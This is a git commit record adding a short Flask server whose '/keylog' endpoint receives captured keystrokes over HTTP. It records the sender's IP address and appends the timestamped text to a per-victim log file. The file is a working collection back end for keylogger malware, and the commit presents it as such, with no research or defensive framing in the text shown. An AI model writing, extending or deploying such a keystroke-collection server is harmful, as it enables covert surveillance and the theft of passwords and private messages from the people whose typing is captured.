36cffcd069e0aac053f818a0aac3e708c48e90fa
fthrslntgy <fatiharslantugay@gmail.com>
2022-08-06 16:42:11 +0300

    server code added

---
+++ server_side/server.py
@@ -0,0 +1,31 @@
+from flask import Flask, request
+from flask_restful import Api, Resource, reqparse
+from flask_cors import CORS
+from datetime import datetime
+
+app = Flask(__name__)
+CORS(app)
+
+@app.route('/keylog', methods=['POST'])
+def post():
+    parser = reqparse.RequestParser()
+    parser.add_argument('logged', required=True)
+    args = parser.parse_args()
+    logged = args['logged']
+    source = request.remote_addr
+    savelogs(logged, source)
+    return {'message' : source + ": " + logged }, 200
+
+@app.route('/home', methods=['GET'])
+def home():
+    return {'message' : "Welcome"}, 200
+
+def savelogs(log, source):
+    now = datetime.now()
+    nowtime = now.strftime("%d-%m-%Y_%H:%M:%S")
+    f = open(source, "a")
+    f.write(nowtime + ": " + log + "\n")
+    f.close()
+
+if __name__ == '__main__':
+    app.run(host="127.0.0.1", port=8000)
